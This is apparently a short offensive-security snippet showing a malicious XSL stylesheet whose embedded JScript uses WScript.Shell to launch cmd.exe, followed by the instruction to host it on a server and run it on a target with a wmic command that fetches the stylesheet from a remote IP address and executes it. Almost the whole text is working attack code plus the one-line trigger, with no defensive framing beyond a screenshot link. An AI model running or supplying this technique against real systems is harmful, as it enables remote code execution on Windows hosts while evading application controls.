```
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>

```

Host on server and run on target with wmic. 
`wmic process get brief /format:"http://192.168.1.164/test.xsl"`
<img width="3349" height="1692" alt="image" src="https://github.com/user-attachments/assets/1bc118a8-91d1-4e1a-ab0e-9f6284800469" />
